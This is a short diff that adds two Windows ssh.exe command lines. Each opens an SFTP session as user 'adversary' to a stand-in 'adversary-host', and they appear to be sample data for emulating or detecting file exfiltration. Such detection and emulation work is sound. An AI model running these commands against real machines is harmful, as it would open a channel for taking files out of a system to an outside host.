@@ -1,0 +1,2 @@
+"C:\WINDOWS\System32\OpenSSH\ssh.exe" -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l adversary -s -- adversary-host sftp
+"C:\WINDOWS\System32\OpenSSH\ssh.exe" "-oForwardX11 no" "-oPermitLocalCommand no" "-oClearAllForwardings yes" "-oForwardAgent no" -l adversary -s -- adversary-host sftp
